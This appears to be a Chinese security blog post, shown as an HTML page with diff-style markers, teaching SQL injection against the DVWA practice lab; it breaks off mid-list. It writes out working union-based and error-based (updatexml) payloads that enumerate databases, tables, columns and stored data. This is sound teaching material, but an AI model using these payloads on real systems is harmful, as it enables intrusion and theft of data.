+        <a  class="All 写点好玩的 "
+           href="/2022/03/15/%E5%86%99%E7%82%B9%E5%A5%BD%E7%8E%A9%E7%9A%84/freemarker%E6%93%8D%E6%8E%A7word/"
+           data-tag="工具使用"
+           data-author="" >
+            <span class="post-title" title="freemarker操控word">freemarker操控word</span>
+            <span class="post-date" title="2022-03-15 12:00:54">2022/03/15</span>
+        </a>
+        
+        
+        <a  class="All 操作系统 "
+           href="/2022/01/31/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/30%E5%A4%A9%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="30天自制操作系统-学习笔记 day1~day10">30天自制操作系统-学习笔记 day1~day10</span>
+            <span class="post-date" title="2022-01-31 10:57:39">2022/01/31</span>
+        </a>
+        
+        
+        <a  class="All 杂项 "
+           href="/2022/01/12/%E6%9D%82%E9%A1%B9/GITHUB%E6%94%B6%E9%9B%86/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="GITHUB收集">GITHUB收集</span>
+            <span class="post-date" title="2022-01-12 20:07:03">2022/01/12</span>
+        </a>
+        
+        
+        <a  class="All 写点好玩的 "
+           href="/2022/01/11/%E5%86%99%E7%82%B9%E5%A5%BD%E7%8E%A9%E7%9A%84/web%E9%A1%B5%E9%9D%A2%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/"
+           data-tag="渗透测试,工具开发"
+           data-author="" >
+            <span class="post-title" title="web页面密码爆破">web页面密码爆破</span>
+            <span class="post-date" title="2022-01-11 10:21:34">2022/01/11</span>
+        </a>
+        
+        
+        <a  class="All web安全工具篇 "
+           href="/2022/01/09/web%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7%E7%AF%87/Goby%E5%88%86%E6%9E%90/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="Goby分析">Goby分析</span>
+            <span class="post-date" title="2022-01-09 13:35:49">2022/01/09</span>
+        </a>
+        
+        
+        <a  class="All 开发工具 "
+           href="/2021/08/15/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/Shell%E8%84%9A%E6%9C%AC%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"
+           data-tag="bash,脚本,shell,linux,开发"
+           data-author="" >
+            <span class="post-title" title="Shell脚本学习笔记">Shell脚本学习笔记</span>
+            <span class="post-date" title="2021-08-15 11:19:55">2021/08/15</span>
+        </a>
+        
+        
+        <a  class="All 渗透测试篇 "
+           href="/2021/07/25/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AF%87/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"
+           data-tag="渗透测试,工具使用"
+           data-author="" >
+            <span class="post-title" title="信息收集">信息收集</span>
+            <span class="post-date" title="2021-07-25 19:33:55">2021/07/25</span>
+        </a>
+        
+        
+        <a  class="All web安全漏洞篇 "
+           href="/2021/05/11/web%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E7%AF%87/SQL%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3/"
+           data-tag="web漏洞,MySQL"
+           data-author="" >
+            <span class="post-title" title="SQL注入相关">SQL注入相关</span>
+            <span class="post-date" title="2021-05-11 15:23:06">2021/05/11</span>
+        </a>
+        
+        
+        <a  class="All web安全工具篇 "
+           href="/2021/04/21/web%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7%E7%AF%87/nmap%E4%BD%BF%E7%94%A8/"
+           data-tag="渗透测试,工具使用"
+           data-author="" >
+            <span class="post-title" title="nmap使用">nmap使用</span>
+            <span class="post-date" title="2021-04-21 19:29:51">2021/04/21</span>
+        </a>
+        
+        
+        <a  class="All 开发工具 "
+           href="/2021/04/20/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/docker%E7%9B%B8%E5%85%B3/"
+           data-tag="工具使用,脚本,docker"
+           data-author="" >
+            <span class="post-title" title="docker相关">docker相关</span>
+            <span class="post-date" title="2021-04-20 13:49:50">2021/04/20</span>
+        </a>
+        
+        
+        <a  class="All web安全漏洞篇 "
+           href="/2021/04/19/web%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E7%AF%87/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9B%B8%E5%85%B3/"
+           data-tag="web漏洞,文件包含"
+           data-author="" >
+            <span class="post-title" title="文件包含漏洞相关">文件包含漏洞相关</span>
+            <span class="post-date" title="2021-04-19 14:49:59">2021/04/19</span>
+        </a>
+        
+        
+        <a  class="All 开发工具 "
+           href="/2021/04/16/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/hexo%E5%91%BD%E4%BB%A4/"
+           data-tag="工具使用,脚本"
+           data-author="" >
+            <span class="post-title" title="hexo相关">hexo相关</span>
+            <span class="post-date" title="2021-04-16 12:12:14">2021/04/16</span>
+        </a>
+        
+        
+        <a  class="All web安全工具篇 "
+           href="/2021/04/16/web%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7%E7%AF%87/xray%E4%BD%BF%E7%94%A8/"
+           data-tag="渗透测试,工具使用"
+           data-author="" >
+            <span class="post-title" title="xray使用">xray使用</span>
+            <span class="post-date" title="2021-04-16 12:10:08">2021/04/16</span>
+        </a>
+        
+        
+        <a  class="All 脚本 "
+           href="/2021/04/15/%E8%84%9A%E6%9C%AC/some-script/"
+           data-tag="bash,脚本,python"
+           data-author="" >
+            <span class="post-title" title="some script">some script</span>
+            <span class="post-date" title="2021-04-15 11:23:33">2021/04/15</span>
+        </a>
+        
+        
+        <a  class="All 环境配置 "
+           href="/2021/04/15/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/centos%E9%83%A8%E7%BD%B2wordpress/"
+           data-tag="linux,环境配置,报错解决,WordPress"
+           data-author="" >
+            <span class="post-title" title="centos部署wordpress">centos部署wordpress</span>
+            <span class="post-date" title="2021-04-15 01:34:16">2021/04/15</span>
+        </a>
+        
+        <div id="no-item-tips">
+
+        </div>
+    </nav>
+    <div id="outline-list">
+    </div>
+</div>
+
+    </div>
+    <div class="hide-list">
+        <div class="semicircle" data-title="切换全屏 快捷键 s">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div id="post">
+    <div class="pjax">
+        <article id="post-web安全漏洞篇/SQL注入相关" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">SQL注入相关</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        <span class="book">
+            <i class="iconfont icon-category"></i>
+            
+            
+            <a  data-rel="web安全漏洞篇">web安全漏洞篇</a>
+            
+        </span>
+        
+        
+        <span class="tag">
+            <i class="iconfont icon-tag"></i>
+            
+            <a class="color1">web漏洞</a>
+            
+            <a class="color1">MySQL</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+            Created At : <time class="date" title='Updated At: 2025-08-10 11:50:56'>2021-05-11 15:23</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        <span>Count:4.3k</span>
+        
+        
+        <span id="busuanzi_container_page_pv">
+            Views 👀 :<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%8F"><span class="toc-text">序</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%BB%80%E4%B9%88%E6%98%AFSQL"><span class="toc-text">1. 什么是SQL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E4%BB%80%E4%B9%88%E6%98%AFSQL%E6%B3%A8%E5%85%A5"><span class="toc-text">2. 什么是SQL注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-SQL%E6%B3%A8%E5%85%A5%E5%8D%B1%E5%AE%B3"><span class="toc-text">3. SQL注入危害</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%B8%B8%E8%A7%81%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-text">4. 常见数据库</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E8%AF%AD%E5%8F%A5"><span class="toc-text">常用命令语句</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%91%BD%E4%BB%A4%E8%AF%AD%E5%8F%A5"><span class="toc-text">1. 命令语句</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%86%85%E7%BD%AE%E5%87%BD%E6%95%B0"><span class="toc-text">2. 内置函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%85%B6%E4%BB%96%E8%A1%A5%E5%85%85"><span class="toc-text">3. 其他补充</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text"></span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%B3%A8%E5%85%A5%E5%88%86%E7%B1%BB"><span class="toc-text">常见注入分类</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5%E5%92%8C%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-text">1. 数字型注入和字符型注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%8F%AF%E5%9B%9E%E6%98%BE%E6%B3%A8%E5%85%A5"><span class="toc-text">2. 可回显注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%97%A0%E5%9B%9E%E6%98%BE%E6%B3%A8%E5%85%A5"><span class="toc-text">3. 无回显注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="toc-text">4. 二次注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E9%80%9A%E8%BF%87SQL%E6%B3%A8%E5%85%A5%E8%AF%BB%E5%86%99%E6%96%87%E4%BB%B6"><span class="toc-text">5. 通过SQL注入读写文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1SQL%E6%B3%A8%E5%85%A5"><span class="toc-text">防御SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%BF%87%E6%BB%A4%E6%95%8F%E6%84%9F%E5%8F%82%E6%95%B0"><span class="toc-text">1. 过滤敏感参数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E4%BD%BF%E7%94%A8%E5%8F%82%E6%95%B0%E5%8C%96%E6%9F%A5%E8%AF%A2"><span class="toc-text">2. 使用参数化查询</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E8%A1%A5%E5%85%85"><span class="toc-text">其他补充</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%85%B3%E4%BA%8E%E5%AD%97%E6%AE%B5%E7%B1%BB%E5%9E%8B"><span class="toc-text">1.关于字段类型</span></a></li></ol></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-4 i,
+    .toc-level-4 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="序"><a href="#序" class="headerlink" title="序"></a>序</h2><h3 id="1-什么是SQL"><a href="#1-什么是SQL" class="headerlink" title="1. 什么是SQL"></a>1. 什么是SQL</h3><p>SQL是结构化查询语言(Structured Query Language)简称，是一种特殊目的的编程语言，是一种数据库查询和程序设计语言，用于存取数据以及查询、更新和管理关系数据库系统；</p>
+<h3 id="2-什么是SQL注入"><a href="#2-什么是SQL注入" class="headerlink" title="2. 什么是SQL注入"></a>2. 什么是SQL注入</h3><ul>
+<li>SQL注入是一种利用用户输入构造SQL语句的攻击。</li>
+<li>如果Web应用没有适当的验证用户输入的信息，攻击者就有可能改变后台执行的SQL语句的结构。由于程序运行SQL语句时的权限与当前该组建（例如，数据库服务器、Web应用服务器、Web服务器等）的权限相同，而这些组件一般的运行权限都很高，而且经常是以管理员的权限运行，所以攻击者获得数据库的完全控制，并可能执行系统命令。</li>
+<li>本质是用户输入作为<strong>SQL</strong>命令被执行 </li>
+</ul>
+<h3 id="3-SQL注入危害"><a href="#3-SQL注入危害" class="headerlink" title="3. SQL注入危害"></a>3. SQL注入危害</h3><ul>
+<li>获取账户密码等敏感信息</li>
+<li>结合读写权限,写入WebShell</li>
+<li>…</li>
+</ul>
+<p><strong>学习参考:</strong></p>
+<p><a target="_blank" rel="noopener" href="https://www.bugbank.cn/q/article/58afc3c06ef394d12a8a4379.html">https://www.bugbank.cn/q/article/58afc3c06ef394d12a8a4379.html</a></p>
+<p><em><span id="more"></span></em> </p>
+<h3 id="4-常见数据库"><a href="#4-常见数据库" class="headerlink" title="4. 常见数据库"></a>4. 常见数据库</h3><ol>
+<li>MS SQL </li>
+<li>MySQL 开源免费</li>
+<li>Access</li>
+<li>Oracle 性能高 价格贵</li>
+</ol>
+<h2 id="常用命令语句"><a href="#常用命令语句" class="headerlink" title="常用命令语句"></a>常用命令语句</h2><blockquote>
+<p>这里使用MySQL的命令为例,参考菜鸟教程</p>
+<p><a target="_blank" rel="noopener" href="https://www.runoob.com/mysql/mysql-tutorial.html">https://www.runoob.com/mysql/mysql-tutorial.html</a></p>
+</blockquote>
+<h3 id="1-命令语句"><a href="#1-命令语句" class="headerlink" title="1. 命令语句"></a>1. 命令语句</h3><p><strong>库、表操作</strong></p>
+<pre><code class="mysql">查看所有数据库
+show databases;
+选择数据库(use+数据库名)
+如: use mysql;
+查看数据库的数据表
+show tables;
+查看数据表字段描述(desc+数据表名)
+如: desc user；
+
+创建数据库
+CREATE DATABASE 数据库名;
+
+创建数据表(需要先使用use 指定数据库)
+CREATE TABLE table_name (column_name column_type);
+</code></pre>
+<p><strong>查询数据表语句</strong></p>
+<pre><code class="mysql">SELECT column_name1,column_name2 FROM table_name [WHERE Clause] [LIMIT N][ OFFSET M]
+
+如
+select * from user;
+select User,Select_priv from user;
+select User,Select_priv from user where Select_priv=&quot;N&quot;;
+select User,Select_priv from user where Select_priv=&quot;N&quot; limit 2;
+select User,Select_priv from user where Select_priv=&quot;N&quot; limit 2 offset 0;
+</code></pre>
+<ul>
+<li>查询语句中你可以使用一个或者多个表，表之间使用逗号(,)分割，并使用WHERE语句来设定查询条件。</li>
+<li>SELECT 命令可以读取一条或者多条记录。</li>
+<li>你可以使用星号（*）来代替其他字段，SELECT语句会返回表的所有字段数据</li>
+<li>你可以使用 WHERE 语句来包含任何条件。</li>
+<li>你可以使用 LIMIT 属性来设定返回的记录数。</li>
+<li>你可以通过OFFSET指定SELECT语句开始查询的数据偏移量。默认情况下偏移量为0</li>
+</ul>
+<p><strong>UNION联合查询</strong></p>
+<pre><code class="mysql">SELECT expression1, expression2, ... expression_n
+FROM tables
+[WHERE conditions]
+UNION [ALL | DISTINCT]
+SELECT expression1, expression2, ... expression_n
+FROM tables
+[WHERE conditions];
+
+select User from tables_priv union select User from user;
+select User from tables_priv union select 1,2,3,4,5,6,7,8;
+</code></pre>
+<ul>
+<li><strong>expression1, expression2, … expression_n</strong>: 要检索的列。</li>
+<li><strong>tables:</strong> 要检索的数据表。</li>
+<li><strong>WHERE conditions:</strong> 可选， 检索条件。</li>
+<li><strong>DISTINCT:</strong> 可选，删除结果集中重复的数据。默认情况下 UNION 操作符已经删除了重复数据，所以 DISTINCT 修饰符对结果没啥影响。</li>
+<li><strong>ALL:</strong> 可选，返回所有结果集，包含重复数据。</li>
+</ul>
+<ul>
+<li>联合的两个表字段数必须相同，不然会产生错误,因此可以使用union select 1,2,3,4,5… 不断尝试进行字段猜解</li>
+</ul>
+<blockquote>
+<p>只写出用到的,其他语句请参考</p>
+<p><a target="_blank" rel="noopener" href="https://www.runoob.com/mysql/mysql-tutorial.html">https://www.runoob.com/mysql/mysql-tutorial.html</a></p>
+</blockquote>
+<h3 id="2-内置函数"><a href="#2-内置函数" class="headerlink" title="2. 内置函数"></a>2. 内置函数</h3><blockquote>
+<p>SQL注入可以使用函数进行报错注入、延时注入、文件读写等</p>
+<p><a target="_blank" rel="noopener" href="http://c.biancheng.net/mysql/function/">http://c.biancheng.net/mysql/function/</a></p>
+</blockquote>
+<p><strong>获取系统信息</strong></p>
+<ul>
+<li>system_user() 返回MySQL连接的当前用户名和主机名</li>
+<li>user()  用户名</li>
+<li>current_user()  当前用户名</li>
+<li>session_user()  连接数据库的用户名</li>
+<li>database()  数据库名</li>
+<li>version()  数据库版本</li>
+<li>@@datadir 数据库路径</li>
+<li>@@basedir  数据库安装路径</li>
+<li>@@version_compile_os  操作系统</li>
+</ul>
+<hr>
+<p><strong>字符串函数</strong></p>
+<ul>
+<li>CONCAT(s1，s2，…) 合并字符串函数，返回结果为连接参数产生的字符串，参数可以使一个或多个。如:<br><code>select concat((select User from user limit 1 offset 0),(select User from user limit 1 offset 1),(select User from user limit 1 offset 2));</code> </li>
+<li>LOWER( )    将字符串中的字母转换为小写</li>
+<li>UPPER( )    将字符串中的字母转换为大写</li>
+<li>LEFT(s，n) 函数返回字符串 s 最左边的 n 个字符。</li>
+<li>RIGHT(s，n)返回字符串 s 最右边边的 n 个字符。</li>
+<li>TRIM( )    删除字符串左右两侧的空格</li>
+<li>SUBSTR(s，n，len) ，从字符串 s 返回一个长度同 len 字符相同的子字符串，起始于位置 n。</li>
+</ul>
+<hr>
+<p><strong>其他函数</strong></p>
+<ul>
+<li>SLEEP(N) 等待 N秒</li>
+<li>IF(expr,v1,v2) 如果表达式 expr 成立，返回结果 v1；否则，返回结果 v2。如<br><code>select IF(SUBSTRING((select User from user limit 1),1,1)=&#39;d&#39;,sleep(1),1);</code><br>该语句从获取User表中User列第一个数据的第一个值,并和d作比较,如果相等sleep 6秒, 否则直接返回, 用于延时注入 </li>
+<li>updatexml (XML_document, XPath_string, new_value); 改变文档中符合条件的节点的值。找不到传入的Xpath值会报错,如<br><code> select * from user where 1=1 and updatexml(1,concat(&#39;~&#39;,@@version,&#39;~&#39;),2);</code><br>该语句中重点是and后面的语句, update无法匹配到正确的Xpath，但是会将括号内的执行结果以错误的形式报出,用于报错注入</li>
+<li>exp(X)此函数返回e(自然对数的底)的X次方的值。如果传入的X值溢出会报错。如<br><code>select exp(~(select*from(select user())x));</code> （不过在我的8.0.23版本MySQL上测试失败)</li>
+<li>rand(x)取随机数，若有参数x，则每个x对应一个固定的值，如果连续多次执行会变化，但是可以预测</li>
+<li>floor 返回<strong>小于等于</strong>该值的最大整数.</li>
+</ul>
+<h3 id="3-其他补充"><a href="#3-其他补充" class="headerlink" title="3. 其他补充"></a>3. 其他补充</h3><p><strong>Mysql中的四种注释符号</strong></p>
+<ol>
+<li>–(后面跟上空格)<br>注:在url输入通常为–+  ，即使用+号替代空格</li>
+<li>/*  注释内容 */</li>
+<li>/*!注释内容 */<br>这种注释在mysql中叫做内联注释，当！后面所接的数据库版本号时，当实际的版本等于或是高于那个字符串，应用程序就会将注释内容解释为SQL，否则就会当做注释来处理。默认的，当没有接版本号时，是会执行里面的内容的。</li>
+<li><h1 id><a href="#" class="headerlink" title></a></h1></li>
+</ol>
+<p><strong>desc  数据表</strong></p>
+<p>获取指定表的字段信息</p>
+<p>如desc user;</p>
+<p><strong>order by num</strong></p>
+<p>order by 会根据后面的值作为参考,对结果进行排序。</p>
+<p>如 order by 2 会按照第二列进行排序</p>
+<p>如果num 的值超过结果的字段数会报错。</p>
+<p><strong>查询其他数据库中的数据</strong></p>
+<p>通常需要使用 use 命令指定一个数据库后 才能对数据库中的表进行操作。</p>
+<p>可以通过 <code> 数据库名.表名</code> 对其他数据库中的表进行操作</p>
+<p><strong>information_schema数据库</strong></p>
+<p>是mysql自带的数据库。存储着所有数据库 、数据表、数据列、用户等信息。</p>
+<p>在SQL注入中常用的表为SCHEMATA表、TABLES表、COLUMNS表</p>
+<p>具体表如下: </p>
+<ul>
+<li>SCHEMATA表：提供了当前mysql实例中所有数据库的信息。是show databases的结果取之此表。</li>
+<li>TABLES表：提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息。是show tables from schemaname的结果取之此表。</li>
+<li>COLUMNS表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。是show columns from schemaname.tablename的结果取之此表。</li>
+<li>STATISTICS表：提供了关于表索引的信息。是show index from schemaname.tablename的结果取之此表。</li>
+<li>USER_PRIVILEGES（用户权限）表：给出了关于全程权限的信息。该信息源自mysql.user授权表。是非标准表。</li>
+<li>SCHEMA_PRIVILEGES（方案权限）表：给出了关于方案（数据库）权限的信息。该信息来自mysql.db授权表。是非标准表。</li>
+<li>TABLE_PRIVILEGES（表权限）表：给出了关于表权限的信息。该信息源自mysql.tables_priv授权表。是非标准表。</li>
+<li>COLUMN_PRIVILEGES（列权限）表：给出了关于列权限的信息。该信息源自mysql.columns_priv授权表。是非标准表。</li>
+<li>CHARACTER_SETS（字符集）表：提供了mysql实例可用字符集的信息。是SHOW CHARACTER SET结果集取之此表。</li>
+<li>COLLATIONS表：提供了关于各字符集的对照信息。</li>
+<li>COLLATION_CHARACTER_SET_APPLICABILITY表：指明了可用于校对的字符集。这些列等效于SHOW COLLATION的前两个显示字段。</li>
+<li>TABLE_CONSTRAINTS表：描述了存在约束的表。以及表的约束类型。</li>
+<li>KEY_COLUMN_USAGE表：描述了具有约束的键列。</li>
+<li>ROUTINES表：提供了关于存储子程序（存储程序和函数）的信息。此时，ROUTINES表不包含自定义函数（UDF）。名为“mysql.proc name”的列指明了对应于INFORMATION_SCHEMA.ROUTINES表的mysql.proc表列。</li>
+<li>VIEWS表：给出了关于数据库中的视图的信息。需要有show views权限，否则无法查看视图信息。</li>
+<li>TRIGGERS表：提供了关于触发程序的信息。必须有super权限才能查看该表</li>
+</ul>
+<h2 id="常见注入分类"><a href="#常见注入分类" class="headerlink" title="常见注入分类"></a>常见注入分类</h2><h3 id="1-数字型注入和字符型注入"><a href="#1-数字型注入和字符型注入" class="headerlink" title="1. 数字型注入和字符型注入"></a>1. 数字型注入和字符型注入</h3><p><strong>两种注入区别</strong></p>
+<pre><code class="mysql">数字型注入查询语句
+select * from user where passwd=1;
+字符型注入查询语句
+select * from user where passwd=&#39;1&#39;;
+
+两者的主要区别是, 字符型注入在实际操作的时候需要考虑到引号的闭合
+如
+数字型注入
+select * from user where passwd=-1 union select passwd from user;
+其payload为: -1 union select passwd from user
+字符型注入
+select * from user where passwd=&#39;-1&#39; union select passwd from user -- &#39;;
+其payload为: -1&#39; union select passwd from user -- &#39;
+</code></pre>
+<p><strong>如何判断数字型注入和字符型注入</strong></p>
+<p>通过使用逻辑运算符判断</p>
+<pre><code class="mysql">数字型注入
+select * from user where passwd=1; #正常返回
+select * from user where passwd=1 and 1=1; # 跟上一个返回同样结果
+select * from user where passwd=1 and 1=2; # 返回为空
+
+字符型注入
+select * from user where passwd=&#39;1&#39;;
+select * from user where passwd=&#39;1 and 1=1&#39;;# 使用数字型注入的Payload返回空
+select * from user where passwd=&#39;1&#39; and &#39;1&#39;=&#39;1&#39;; # 返回正常页面,则为字符型注入(注意最后的单引号闭合)
+select * from user where passwd=&#39;1&#39; and 1=1 -- &#39;; #也可使用 注释符号去掉单引号
+</code></pre>
+<p><strong>注</strong></p>
+<p>如果查询语句条件的值使用引号，而值对应的字段的具体的类型为数字型(int 等),情况较为特殊，参考最下文的补充</p>
+<h3 id="2-可回显注入"><a href="#2-可回显注入" class="headerlink" title="2. 可回显注入"></a>2. 可回显注入</h3><p><strong>联合查询注入</strong></p>
+<blockquote>
+<p>当我们查询的数据库信息会回显到浏览器上时,考虑使用联合查询注入</p>
+<p>流程:</p>
+<ol>
+<li></li>
+</ol>
+</blockquote>
+<blockquote>
+<p>这里使用dvwa  low难度进行具体的演示</p>
+<p>关键查询语句为</p>
+<p><code>$query = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39;;&quot;;</code></p>
+<p>输入 1</p>
+<p><img src="/2021/05/11/web%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E7%AF%87/SQL%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3/hexo\source_posts\web安全漏洞篇\png\img2\image-20210516112342059.png" alt="image-20210516112342059"></p>
+<p>判断是否为字符型</p>
+<p>… 略  源代码为字符型</p>
+<p>注意, 下面的输入 在 – 后面都有空格</p>
+<p>判断显示字段( -1’ union select 1,2 –  )</p>
+<p><img src="/2021/05/11/web%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E7%AF%87/SQL%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3/hexo\source_posts\web安全漏洞篇\png\img2\image-20210516124646448.png" alt="image-20210516124646448"></p>
+<p>使用自带函数获取敏感信息(-1’ union select database(),@@datadir –  )</p>
+<p><img src="/2021/05/11/web%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E7%AF%87/SQL%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3/hexo\source_posts\web安全漏洞篇\png\img2\image-20210516124826965.png" alt="image-20210516124826965"></p>
+<hr>
+<p>开始手工获取信息</p>
+<ol>
+<li><p>获取数据库信息( 通过更改offset的值遍历数据库)</p>
+<p>在information_schema.SCHEMATA的SCHEMA_NAME列存储的是数据库的名字<br>-1’ union select (select SCHEMA_NAME from information_schema.SCHEMATA limit 1 offset 0),2 –<br>-1’ union select (select SCHEMA_NAME from information_schema.SCHEMATA limit 1 offset 1),2 –<br>-1’ union select (select SCHEMA_NAME from information_schema.SCHEMATA limit 1 offset 2),2 – </p>
+<p><img src="/2021/05/11/web%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E7%AF%87/SQL%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3/hexo\source_posts\web安全漏洞篇\png\img2\image-20210516134928345.png" alt="image-20210516134928345"></p>
+</li>
+<li><p>从dvwa数据库中获取数据表信息<br>-1’ union select (select table_name from information_schema.tables where TABLE_SCHEMA=’dvwa’ limit 1 offset 0),2 –<br>-1’ union select (select table_name from information_schema.tables where TABLE_SCHEMA=’dvwa’ limit 1 offset 1),2 –<br><img src="/2021/05/11/web%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E7%AF%87/SQL%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3/hexo\source_posts\web安全漏洞篇\png\img2\image-20210516140446014.png" alt="image-20210516140446014"> </p>
+</li>
+<li><p>获取guestbook数据表的字段信息<br>-1’ union select (select column_name from information_schema.columns where TABLE_NAME=’guestbook’ limit 1 offset 1),2 –<br><img src="/2021/05/11/web%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E7%AF%87/SQL%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3/hexo\source_posts\web安全漏洞篇\png\img2\image-20210516140730824.png" alt="image-20210516140730824"></p>
+</li>
+<li><p>获取该列具体数据(此时已知了数据库、表等信息可直接查询)<br>-1’ union select (select comment from dvwa.guestbook limit 1 offset 0),2 –<br><img src="/2021/05/11/web%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E7%AF%87/SQL%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3/hexo\source_posts\web安全漏洞篇\png\img2\image-20210516140952510.png" alt="image-20210516140952510"></p>
+</li>
+</ol>
+</blockquote>
+<hr>
+<p><strong>报错注入</strong></p>
+<p>当我们在应用中输入异常数据、或者使用内置函数报错导致SQL语句执行失败时，有的时候web服务器会返回错误信息。</p>
+<p>报错注入的本质是</p>
+<ol>
+<li>传入的参数中包含了内置函数</li>
+<li>内置函数的参数为获取信息的语句</li>
+<li>函数执行失败</li>
+<li>web服务器返回报错</li>
+</ol>
+<p>在dvwa中输入<code>1&#39; and updatexml(1,concat(0x7e,(select user()),0x7e),1) -- </code></p>
+<p>数据库会将<code>concat(0x7e,(select user()),0x7e)</code> 的结果值作为xmlpath,因为找不到这一路径导致报错</p>
+<p><img src="/2021/05/11/web%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E7%AF%87/SQL%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3/hexo\source_posts\web安全漏洞篇\png\img2\image-20210516221459561.png" alt="image-20210516221459561"></p>
+<p>将concat中的select user() 换成其他的值即可进行报错注入</p>
+<pre><code class="mysql">#获取数据库
+1&#39; and updatexml(1,concat(0x7e,(select SCHEMA_NAME from information_schema.SCHEMATA limit 1 offset 0),0x7e),1) -- 
+
+#获取数据表
+1&#39; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where TABLE_SCHEMA=&#39;dvwa&#39; limit 1 offset 0),0x7e),1) -- 
+
+#获取列
+1&#39; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where TABLE_NAME=&#39;guestbook&#39; limit 1 offset 1),0x7e),1) -- 
+
+#获取信息
+1&#39; and updatexml(1,concat(0x7e,(select comment from dvwa.guestbook limit 1 offset 0),0x7e),1) -- 
+
+</code></pre>
+<p>常用函数以及payload</p>
+<ul>
